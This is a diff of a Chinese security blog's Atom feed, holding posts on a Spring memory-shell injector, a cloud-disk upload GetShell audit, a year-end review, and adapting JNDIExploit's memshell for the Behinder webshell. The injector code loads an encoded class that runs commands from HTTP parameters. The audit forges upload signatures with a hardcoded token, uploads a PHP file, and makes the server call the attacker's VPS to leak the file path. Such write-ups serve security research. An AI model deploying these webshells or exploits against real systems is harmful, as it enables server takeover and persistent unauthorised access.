bgEAE2phdmEvaW8vSU9FeGNlcHRpb24BACtqYXZhL2xhbmcvcmVmbGVjdC9JbnZvY2F0aW9uVGFyZ2V0RXhjZXB0aW9uAQAaRHluYW1pY0ludGVyY2VwdG9yVGVtcGxhdGUBAEFvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L2hhbmRsZXIvSGFuZGxlckludGVyY2VwdG9yQWRhcHRlcgEAE2phdmF4L2NyeXB0by9DaXBoZXIBABNbTGphdmEvbGFuZy9TdHJpbmc7AQAYamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kAQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWAQAlamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdAEADGdldFBhcmFtZXRlcgEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7AQAGZXF1YWxzAQAVKExqYXZhL2xhbmcvT2JqZWN0OylaAQAHaXNFbXB0eQEAAygpWgEADGphdmEvaW8vRmlsZQEACXNlcGFyYXRvcgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACgoW0xqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQARamF2YS9sYW5nL1Byb2Nlc3MBAA5nZXRJbnB1dFN0cmVhbQEAFygpTGphdmEvaW8vSW5wdXRTdHJlYW07AQAYKExqYXZhL2lvL0lucHV0U3RyZWFtOylWAQAMdXNlRGVsaW1pdGVyAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS91dGlsL1NjYW5uZXI7AQAEbmV4dAEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQAmamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2UBAAlnZXRXcml0ZXIBABcoKUxqYXZhL2lvL1ByaW50V3JpdGVyOwEAE2phdmEvaW8vUHJpbnRXcml0ZXIBAAlnZXRIZWFkZXIBAAlnZXRNZXRob2QBAApnZXRTZXNzaW9uAQAiKClMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXNzaW9uOwEAA3B1dAEAOChMamF2YS9sYW5nL09iamVjdDtMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7AQAeamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXNzaW9uAQAMc2V0QXR0cmlidXRlAQAnKExqYXZhL2xhbmcvU3RyaW5nO0xqYXZhL2xhbmcvT2JqZWN0OylWAQALZ2V0SW5zdGFuY2UBACkoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZheC9jcnlwdG8vQ2lwaGVyOwEADGdldEF0dHJpYnV0ZQEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9PYmplY3Q7AQAGYXBwZW5kAQAtKExqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL1N0cmluZ0J1aWxkZXI7AQAtKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZ0J1aWxkZXI7AQAIdG9TdHJpbmcBAAhnZXRCeXRlcwEABCgpW0IBABcoW0JMamF2YS9sYW5nL1N0cmluZzspVgEABGluaXQBABcoSUxqYXZhL3NlY3VyaXR5L0tleTspVgEACWdldFJlYWRlcgEAGigpTGphdmEvaW8vQnVmZmVyZWRSZWFkZXI7AQAWamF2YS9pby9CdWZmZXJlZFJlYWRlcgEACHJlYWRMaW5lAQAMZGVjb2RlQnVmZmVyAQAWKExqYXZhL2xhbmcvU3RyaW5nOylbQgEAB2RvRmluYWwBAAYoW0IpW0IBAAdmb3JOYW1lAQAlKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL0NsYXNzOwEAEWphdmEvbGFuZy9JbnRlZ2VyAQAEVFlQRQEAEWdldERlY2xhcmVkTWV0aG9kAQBAKExqYXZhL2xhbmcvU3RyaW5nO1tMamF2YS9sYW5nL0NsYXNzOylMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwEADXNldEFjY2Vzc2libGUBAAQoWilWAQAIZ2V0Q2xhc3MBABMoKUxqYXZhL2xhbmcvQ2xhc3M7AQAOZ2V0Q2xh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&quot;;
+    static String clazzName = &quot;DynamicInterceptorTemplate&quot;;
+
+    static {
+        try {
+            Class&lt;?&gt; RequestContextUtils = Class.forName(&quot;org.springframework.web.servlet.support.RequestContextUtils&quot;);
+
+            Method getWebApplicationContext;
+            try {
+                getWebApplicationContext = RequestContextUtils.getDeclaredMethod(&quot;getWebApplicationContext&quot;, ServletRequest.class);
+            } catch (NoSuchMethodException e) {
+                getWebApplicationContext = RequestContextUtils.getDeclaredMethod(&quot;findWebApplicationContext&quot;, HttpServletRequest.class);
+            }
+            getWebApplicationContext.setAccessible(true);
+
+            WebApplicationContext context = (WebApplicationContext) getWebApplicationContext.invoke(null, ((ServletRequestAttributes) RequestContextHolder.currentRequestAttributes()).getRequest());
+
+            //从requestMappingHandlerMapping中获取adaptedInterceptors属性 老版本是DefaultAnnotationHandlerMapping
+            org.springframework.web.servlet.handler.AbstractHandlerMapping abstractHandlerMapping;
+            try {
+                Class&lt;?&gt; RequestMappingHandlerMapping = Class.forName(&quot;org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping&quot;);
+                abstractHandlerMapping = (org.springframework.web.servlet.handler.AbstractHandlerMapping) context.getBean(RequestMappingHandlerMapping);
+            } catch (BeansException e) {
+                Class&lt;?&gt; DefaultAnnotationHandlerMapping = Class.forName(&quot;org.springframework.web.servlet.mvc.annotation.DefaultAnnotationHandlerMapping&quot;);
+                abstractHandlerMapping = (org.springframework.web.servlet.handler.AbstractHandlerMapping) context.getBean(DefaultAnnotationHandlerMapping);
+            }
+
+            java.lang.reflect.Field field = org.springframework.web.servlet.handler.AbstractHandlerMapping.class.getDeclaredField(&quot;adaptedInterceptors&quot;);
+            field.setAccessible(true);
+            java.util.ArrayList&lt;Object&gt; adaptedInterceptors = (java.util.ArrayList&lt;Object&gt;) field.get(abstractHandlerMapping);
+
+            //加载ysoserial.payloads.templates.SpringInterceptorTemplate类的字节码
+            byte[] bytes = sun.misc.BASE64Decoder.class.newInstance().decodeBuffer(b64);
+            java.lang.ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
+            java.lang.reflect.Method m0 = ClassLoader.class.getDeclaredMethod(&quot;defineClass&quot;, String.class, byte[].class, int.class, int.class);
+            m0.setAccessible(true);
+            m0.invoke(classLoader, clazzName, bytes, 0, bytes.length);
+            //添加SpringInterceptorTemplate类到adaptedInterceptors
+            adaptedInterceptors.add(classLoader.loadClass(clazzName).newInstance());
+        } catch (Exception e) {
+//            e.printStackTrace();
+        }
+    }
+
+    @Override
+    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
+
+    }
+
+    @Override
+    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {
+
+    }
+}
+</code></pre>
+<p>成功执行<br>
+<img src="https://sl3epf.github.io/post-images/1705156354824.png" alt="" loading="lazy"><br>
+但是貌似路径只能限制在<code>/3.0/authService/config</code>这里。<br>
+测试tomcat的listener类型内存马也可以。<br>
+<img src="https://sl3epf.github.io/post-images/1705156537262.png" alt="" loading="lazy"></p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[代码审计-某云盘系统GetShell]]></title>
+        <id>https://sl3epf.github.io/post/CGspU2zIY/</id>
+        <link href="https://sl3epf.github.io/post/CGspU2zIY/">
+        </link>
+        <updated>2024-01-04T04:50:09.000Z</updated>
+        <content type="html"><![CDATA[<!-- more -->
+<h1 id="前言">前言</h1>
+<p>看到这个系统的文件上传挺有意思的，弄了套源码过来看看。</p>
+<h1 id="分析">分析</h1>
+<p>漏洞路由在 /server/index.php<br>
+对应文件的漏洞点函数<br>
+<img src="https://sl3epf.github.io/post-images/1704344315196.png" alt="" loading="lazy"><br>
+可以看到通过 md 参数可以进行 upload 和 download 的操作<br>
+但是首先还是要过前面三个 if，第一个直接传 md=upload 就好，第二个需要接收一个 sign 的签名参数。<br>
+重点看第三个，需要验证签名，我们跟入</p>
+<pre><code class="language-php">protected function sign_verify($params,$sign): bool
+{
+        return $this-&gt;sign_params($params) == $sign;
+}
+
+ protected function sign_params($params): string
+    {
+        // 过滤参数
+        $params = array_filter($params,function($key) use ($params){
+            if(empty($params[$key]) || $key == 'sign'){
+                return false;
+            }
+            return true;
+        },ARRAY_FILTER_USE_KEY);
+
+        // ascii排序
+        ksort($params);
+        reset($params);
+
+        // 签名
+        return md5(urldecode(http_build_query($params)) . $this-&gt;config['token']);
+    }
+</code></pre>
+<p>总体来说，这个函数的目的是对一组参数进行签名，首先通过过滤和排序确保参数的一致性，然后利用<code>http_build_query</code>将参数连接成字符串，加上token，最后用md5生成 sign，判断我们输入的 sign 是否和生成的相等。<br>
+而这个 token 我们也可以直接找到，是硬编码<br>
+<img src="https://sl3epf.github.io/post-images/1704345026812.png" alt="" loading="lazy"><br>
+于是就可以构造出文件上传<br>
+<img src="https://sl3epf.github.io/post-images/1704345196242.jpg" alt="" loading="lazy"><br>
+我们往下看发现这里需要传入一个 uid 参数，然后进入 <code>upload_file</code> 函数<br>
+<img src="https://sl3epf.github.io/post-images/1704345294348.png" alt="" loading="lazy"><br>
+跟进去看也可以发现是一个很常规的文件上传函数，并没有做任何的过滤。<br>
+构造出上传请求，其中传入的 uid 会作为我们上传文件的目录</p>
+<pre><code class="language-html">POST /server/index.php?md=upload&amp;sign=e8766abd8742eb67a2c07b089ecf636a&amp;uid=1 HTTP/2.0
+Host: xxxx
+Content-Type: multipart/form-data; boundary=------------------------ZKUEuJmuCMrQNDmEHNoSaDEXDrygeXDHXShtOfZf
+cookie: xxxx
+Content-Length: 457
+
+--------------------------ZKUEuJmuCMrQNDmEHNoSaDEXDrygeXDHXShtOfZf
+Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;1.php&quot;
+
+test
+
+--------------------------ZKUEuJmuCMrQNDmEHNoSaDEXDrygeXDHXShtOfZf
+</code></pre>
+<p>发包后就会走到</p>
+<pre><code class="language-php">// 回调通知
+                $res = $this-&gt;upload_notify($_GET['notify'],$info);
+                if($res != 'UPLOAD_SUCCESS'){
+                    $this-&gt;returnJson(0,'同步错误：'.$res);
+                }
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://sl3epf.github.io/post-images/1704345614802.png" alt="" loading="lazy"></figure>
+<p>这里虽然报错，但是其实已经传上去了...因为<code>upload_file</code>函数已经走完了<br>
+但是他并没有返回给我们路径，并且在函数里可以看到他的文件名是随机的 16 位字符</p>
+<pre><code class="language-php">// 文件后缀
+        $file_ext = strtolower(pathinfo($file['name'],PATHINFO_EXTENSION));
+
+        // 获取保存目录
+        $save_dir = $this-&gt;getUserUploadPath($uid);
+
+        // 获取保存文件夹
+        $file_name = 'file_'.$this-&gt;getRandomName(16);
+
+        // 最终保存路径
+        $save_file = $this-&gt;runtime_path . $save_dir . $file_name .'.'. $file_ext;
+
+        // 保存文件
+        move_uploaded_file($file[&quot;tmp_name&quot;], $save_file);
+
+
+        if(!is_file($save_file)){
+            $this-&gt;returnJson(0,'文件上传失败：Error Move Files');
+        }
+</code></pre>
+<p>但是有趣的是他下面还调用了一个<code>upload_notify</code>函数，跟进</p>
+<pre><code class="language-php">protected function upload_notify($url,$param)
+    {
+        // 生成签名
+        $sign = $this-&gt;sign_params($param);
+        $param['sign'] = $sign;
+
+        // 请求地址
+        $request_url = $url.'?'.urldecode(http_build_query($param));
+
+        $ch = curl_init();
+        curl_setopt($ch, CURLOPT_URL, $request_url);
+        curl_setopt($ch, CURLOPT_HEADER, 0);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
+
+        $result = curl_exec($ch);
+        curl_close($ch);
+        return $result;
+    }
+</code></pre>
+<p>这个函数意思就是调用了 curl去对传入的 url 发起一次请求，并将响应的结果返回<br>
+但是似乎我们还是获取不到路径，这里我们再关注第二个参数<code>$param</code>，它是由前面的<code>$info</code>传入<br>
+<img src="https://sl3epf.github.io/post-images/1704369997209.png" alt="" loading="lazy"><br>
+而 info 又是 upload_file 的返回值</p>
+<pre><code class="language-php">// 文件信息
+        return [
+            'name' =&gt; $file['name'],
+            'ext' =&gt; $file_ext,
+            'path' =&gt; $save_dir . $file_name .'.'. $file_ext,
+            'size' =&gt; $size,
+            'mime' =&gt; $mime_type
+        ];
+</code></pre>
+<p>可以看到他的文件名路径等信息都在里面，所以我们只需要构造一个 url 让程序去请求我们的地址，我们再看请求的记录就能看到路径信息</p>
+<h1 id="利用">利用</h1>
+<p>先在 vps 上起个http服务<br>
+然后利用签名脚本生成签名</p>
+<pre><code class="language-php">&lt;?php
+function sign_params($params): string
+{
+    // 过滤参数
+    $params = array_filter($params,function($key) use ($params){
+        if(empty($params[$key]) || $key == 'sign'){
+            return false;
+        }
+        return true;
+    },ARRAY_FILTER_USE_KEY);
+
+    // ascii排序
+    ksort($params);
+    reset($params);
+    var_dump($params);
+    // 签名
+    //http_build_query($params) 将参数数组拼接成 URL 查询字符串。
+    var_dump($params);
+    var_dump(http_build_query($params));
+    return md5(urldecode(http_build_query($params)) . &quot;asdasfasfasfasfasfa&quot;);
+}
+
+$_GET['md'] = &quot;upload&quot;;
+$_GET['uid'] = &quot;3&quot;;
+$_GET['notify'] = 'http://ip:port/';
+echo sign_params($_GET);
+</code></pre>
+<p>然后构造请求</p>
+<pre><code class="language-html">POST /server/index.php?md=upload&amp;sign=签名&amp;uid=1&amp;notify=http://ip:port HTTP/2.0
+Host:  xxxx
+Content-Type: multipart/form-data; boundary=------------------------ZKUEuJmuCMrQNDmEHNoSaDEXDrygeXDHXShtOfZf
+Content-Length: 457
+
+--------------------------ZKUEuJmuCMrQNDmEHNoSaDEXDrygeXDHXShtOfZf
+Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;1.php&quot;
+
+test
+
+--------------------------ZKUEuJmuCMrQNDmEHNoSaDEXDrygeXDHXShtOfZf\
+</code></pre>
+<p>回到服务器上就能看到请求<br>
+<img src="https://sl3epf.github.io/post-images/1704370760018.png" alt="" loading="lazy"><br>
+成功访问<br>
+<img src="https://sl3epf.github.io/post-images/1704370803067.png" alt="" loading="lazy"></p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[2023年终总结]]></title>
+        <id>https://sl3epf.github.io/post/q0RqVX7zC/</id>
+        <link href="https://sl3epf.github.io/post/q0RqVX7zC/">
+        </link>
+        <updated>2023-12-31T15:59:59.000Z</updated>
+        <content type="html"><![CDATA[<!-- more -->
+<h1 id="前言">前言</h1>
+<p>代码调的有点头晕了，再看下去不礼貌了。想想今年就最后两三天了，也准备放元旦假了，趁着这个时间来写一下今年的一些事情想法。网易云，启动！</p>
+<h1 id="自己如何看待自己">自己如何看待自己</h1>
+<p>今年确实是成长很大的一年，先不说技术方面，这个后面写。<br>
+经历了很多事情，也认识了很多师傅朋友，比起以前自己一直闭门造车好多了。圈子这个东西确实很重要，一个好的朋友圈，增长自己见识，也能多交流出想法，做项目很多时候就是和队友聊天聊出思路的。相较于前几年，今年也更愿意发言了。<br>
+在感情上吧，今年倒是没有花什么心思了（没对象能花了）😅，暂时也没遇到特别有感觉的人，有时候觉得一个人也挺好，但是遇到的时候该把握还是得把握住。<br>
+今年的心态也放的比较平了，其实每个人都有自己的生活，也没必要老是和别人比较啥的。羡慕归羡慕，看看得了，不要自我内耗，没啥意义。自己觉得过的开心就好了，一家人平安开心，不就最好了吗。</p>
+<h1 id="今年做了哪些事情">今年做了哪些事情</h1>
+<p>看到这个标题，脑子里就放回忆录一样的。事情确实多，今年过得也确实快，感觉上次写总结还是在昨天😰<br>
+记流水账还是吃老本了。</p>
+<h2 id="一月">一月</h2>
+<p>去年十二月多就放假了，所以一月已经在家里躺着了。md🐑了是真难受啊。<br>
+那段时间在家里做课设，后面又开始学习了golang，帮忙给团队录下课。<br>
+每天早饭必看木鱼解说的水浒传，但是貌似现在还没看完。开开心心过完年，又要准备开学了。<br>
+<img src="https://sl3epf.github.io/post-images/1703852496332.JPG" alt="" loading="lazy"></p>
+<h2 id="二-三月">二、三月</h2>
+<p>刚回学校这两月确实没啥太多事，就开始补去年的期末考试，平时就写写代码，感觉这个月一直在搞开发去了，当时又用go写了一些垃圾系统和工具。接着又和一个师傅一起挖了下src，搞了点钱，吃饭吃没了。打打球，上上课，这个时候还是没什么事情。</p>
+<h2 id="四月">四月</h2>
+<p>到这个时候就陆陆续续开始有项目了，先是有一段时间的远程渗透测试，目标给的真的太小了，打点打了好久没啥特别有价值的东西，后面找客户要了个vpn，才好打一些。后面陪老板出个差，去无锡玩了几天，还是挺安静的感觉，地铁都没啥人，（可能是我没去商业区又是工作日？），绿化真普及感觉。<br>
+<img src="https://sl3epf.github.io/post-images/1703853444685.JPG" alt="" loading="lazy"><br>
+<img src="https://sl3epf.github.io/post-images/1703853527234.png" alt="" loading="lazy"><br>
+还有一件事就是正式把学校的团队拉起来了，也进行了第一次的招新赛，虽然有点仓促，也不太正式，但是后面会慢慢变好的。这也是在高中就有的一个想法。在今年也算是完成了。</p>
+<h2 id="五月">五月</h2>
+<p>本来是要去个市护，但是面完那边说年纪太小了，客户要毕业的。后面就又被叫去打了一个军区的比赛，直接断网四小时，比赛也没提前告诉我是要干啥，打CTF还是测试目标，啥也没说就把人喊过去，我纯坐牢。断网查不了资料，我电脑有些工具还没有，一个人还得做五个方向，一个web🐶会个🐔。<br>
+中旬的时候去了打了个行业护网，半个月。老板给叫了个蓝高的大哥一起，大哥人很好，对我多有照顾，从中也学到了很多之前都没接触过的知识。前一段时间平安度过，红队没摸到这边来，后面两个人还都🐑了（我又🐑了。。。）带病上班，后面就在宾馆远程了，在最后两三天的某个下午，突然一条弱口令登录成功的告警+文件上传出现在我眼前，立刻展开分析，第二天也是直接被领导叫回去了，🐑的也差不多了，最后分析是一个被遗漏的站，被ct打了个内存马，两个人累死累活，啥活都要干，没想到最忙的是最后一两天。</p>
+<h2 id="六月">六月</h2>
+<p>回学校又要准备期末和课设了，和几个大哥吃了顿饭，学到了很多技术以外的东西。<br>
+和朋友去长沙玩了一趟，之前一直往长沙跑，但是都没好好玩过。<br>
+快到月底的时候又有个单位的渗透，为国护提前准备准备，还有几位大厂的红队师傅，提前演练一下。单位设备上了挺多的，直接模拟钓鱼上个🐎子，虽然能拿下一些机器，但是域控还是打不动，也是学到了一些姿势。</p>
+<h2 id="七月">七月</h2>
+<p>渗透 + 一个无人机的app，也是搞到无人机来玩了下，不过好像从明年开始有新规了。<br>
+<img src="https://sl3epf.github.io/post-images/1703856935405.jpeg" alt="" loading="lazy"><br>
+回来没呆几天，又接到通知，提前过去给客户培训，顺带做下国护的排查。<br>
+<img src="https://sl3epf.github.io/post-images/1703857633492.png" alt="" loading="lazy"><br>
+在上海也发现了一家挺便宜的烧烤店，刚好也在我住的附近，美美吃了几顿。<br>
+大概培训了有一周多，每天都感觉挺折磨的，主要都不是搞技术的，讲了也没啥人听，但是大家都是为了任务而来的。那段时间天天在宾馆玩逆水寒，周末就在宾馆躺尸了，点外卖躺一天。。。<br>
+<img src="https://sl3epf.github.io/post-images/1703857960201.JPG" alt="" loading="lazy"></p>
+<h2 id="八月">八月</h2>
+<p>培训结束刚好后面两天就国护开始了，完美的衔接。<br>
+国护单位挺平静的，基本上老老实实坐十五天。甲方今年零食都没多少...只能多炫一点食堂的菜了。<br>
+干完今年的活基本上也差不多了。<br>
+<img src="https://sl3epf.github.io/post-images/1703858349750.png" alt="" loading="lazy"></p>
+<h2 id="九月">九月</h2>
+<p>九月又开学了，有些项目的款结了一部分，给自己换了台电脑。小黄鱼还是有挺多好东西的。16寸的mac确实舒服多了。<br>
+本来以为可以休息下，这边的省护又来了。于是乎又请了半个月假打省护去了，直接请到国庆节，放了二十多天假（当然红队坐牢不算放假），ga伙食真不行，天天吃盒饭，住的地方还要自己找<br>
+<img src="https://sl3epf.github.io/post-images/1703858716381.JPG" alt="" loading="lazy"><br>
+省护瓜还挺多的，下次试试近源嘻嘻</p>
+<h2 id="十月">十月</h2>
+<p>放完国庆回来，老师通知又叫我们去打个市护。成果还不错，突突突了一些内网，最后也是拿了个第三，幸不辱命。<br>
+<img src="https://sl3epf.github.io/post-images/1703859563887.JPG" alt="" loading="lazy"><br>
+打完这个月也基本上是没了，这个课是上不了一点。一些老师都要给我挂科了...真的麻</p>
+<h2 id="十一月">十一月</h2>
+<p>和朋友去武功山玩了一趟，真特种兵，夜爬，等日出，白天再徒步下山。真的累，这辈子不想爬山了，但是风景真的不错。<br>
+<img src="https://sl3epf.github.io/post-images/1703860017503.png" alt="" loading="lazy"><br>
+<img src="https://sl3epf.github.io/post-images/1703860023119.png" alt="" loading="lazy"><br>
+月底打了个湘军杯，6个小时，拿了个第三，还是舍得给钱的。<br>
+<img src="https://sl3epf.github.io/post-images/1703860344781.png" alt="" loading="lazy"><br>
+打完去洗个脚按个摩，舒舒服服。<br>
+<img src="https://sl3epf.github.io/post-images/1703860422168.png" alt="" loading="lazy"></p>
+<h2 id="十二月">十二月</h2>
+<p>今年多了个计算机程序设计大赛攻防邀请赛，明年似乎是第一届，今年可能试试水。<br>
+不过多搞个一等奖还是不错的，学校也挺重视这比赛，拿奖+免费旅游。<br>
+<img src="https://sl3epf.github.io/post-images/1703860878722.jpg" alt="" loading="lazy"><br>
+比赛打完了，项目也基本没有了。可能就平常一点渗透，挖洞测试啥的。</p>
+<h1 id="今年的进步">今年的进步</h1>
+<p>简单回顾了一下一整年的事情。今年在技术上无疑是成长了许多，在java、内网、包括外网打点还有蓝队相关经验都是有学到很多。当然开发有提升，但是感觉不多，只是对业务逻辑更加熟悉了，看到有些站，基本上能猜到代码大概是咋写的。<br>
+不过还是得多花点时间来耐心钻研技术，其实很多项目中，能学到一些东西，但是大部分还是吃老本，但是时间也是花了的。项目比赛还是一个检测自身学习成果的一个东西，学到的东西能不能用上，实践会出结果。</p>
+<h1 id="flag">flag</h1>
+<p>代审，主要是Java安全方面，争取挖范围广一点的0day。<br>
+免杀和内网也是需要重点学习的，争取在一些对抗的环境下有更大的突破，还有更加OPSEC一点，慢慢往红队方向靠。<br>
+继续赚钱(满眼都是世俗的欲望💰)<br>
+多读点书，感觉自己文化水平太低了，有时候一些话都不会表达。像这篇一样。<br>
+找个女朋友？看缘分了要</p>
+<h1 id="结语">结语</h1>
+<p>最后提前祝大家新年快乐。<br>
+明年好好卷，要去实习了，身份也要转化一下了。<br>
+不管怎么样，还是希望在自己喜欢的行业有所成就。<br>
+收收心，继续加油。</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[二改JNDIExploit的Spring内存马适配冰蝎]]></title>
+        <id>https://sl3epf.github.io/post/b_uiDGqEw/</id>
+        <link href="https://sl3epf.github.io/post/b_uiDGqEw/">
+        </link>
+        <updated>2023-12-30T05:30:05.000Z</updated>
+        <content type="html"><![CDATA[<!-- more -->
+<h1 id="前言">前言</h1>
+<p>我们知道https://github.com/WhiteHSBG/JNDIExploit 工具注入的冰蝎内存马是经过改造后的冰蝎，网上并没有改造好的与之适配的冰蝎客户端放出来，原版的冰蝎是连接不上的。<br>
+与其去二改冰蝎的客户端，我们不如直接改这个jndi工具。</p>
+<h1 id="漏洞环境">漏洞环境</h1>
+<p>https://github.com/j3ers3/Hello-Java-Sec<br>
+这个代码审计环境中的jndi注入模块。</p>
+<h1 id="分析">分析</h1>
+<p>我们先用原工具逻辑去打Spring的冰蝎内存马<br>
+也就是对应<code>SpringMemshell</code>模块<br>
+分析代码，这个codeCLass处就是工具用的内存马。<br>
+<img src="https://sl3epf.github.io/post-images/1703942645272.png" alt="" loading="lazy"><br>
+我们将它复制出来，解码成class看看<br>
+<img src="https://sl3epf.github.io/post-images/1703943264159.png" alt="" loading="lazy"><br>
+逻辑很明了，前面的if提供了一个页面回显的马，后面else就是魔改后的冰蝎<br>
+它的密码md5解密后依然是rebeyond，连接需要多加一个<code>X-Options-Ai</code>的请求头，但是为什么还是连不上呢？<br>
+我们要注意有一行<code>Method targetMethod = evilClass.getDeclaredMethod(&quot;equals&quot;, ServletRequest.class, ServletResponse.class);</code><br>
+想起来之前分析冰蝎的马，最后是equals接收了jsp的上下文对象<code>pageContext</code>，有这个获取request和response，而request又可以获取session。有了它们就能执行webshell的操作。<br>
+所以说不能用呢，冰蝎这里是接收一个参数<br>
+<img src="https://sl3epf.github.io/post-images/1704001584739.png" alt="" loading="lazy"><br>
+而jndi工具的equals方法传入的是两个参数。</p>
+<h1 id="改造">改造</h1>
+<p>其实要改也很简单，将其中冰蝎的逻辑换成自己的就行了。<br>
+我们先把原来的<code>DynamicInterceptorTemplate.java</code>拿出来，找到冰蝎的逻辑部分进行修改</p>
+<p>这里还需要知道一个点。暂时没有办法从spring和tomcat中获取pageContext，但是好在新版冰蝎服务端已经不再依赖pageContext，可以看https://github.com/rebeyond/Behinder/issues/151<br>
+我们只需要传入request和response，然后通过HashMap添加<br>
+<img src="https://sl3epf.github.io/post-images/1703949212902.png" alt="" loading="lazy"><br>
+更改代码如下</p>
+<pre><code class="language-java">else if (request.getHeader(this.behinderShellHeader) != null) {
+            try {
+                if (request.getMethod().equals(&quot;POST&quot;)) {
+                    //System.out.println(&quot;QiuQIu&quot;);
+                    HttpSession session = request.getSession();
+                    HashMap pageContext = new HashMap();
+                    pageContext.put(&quot;request&quot;, request);
+                    pageContext.put(&quot;response&quot;,response);
+                    pageContext.put(&quot;session&quot;,session);
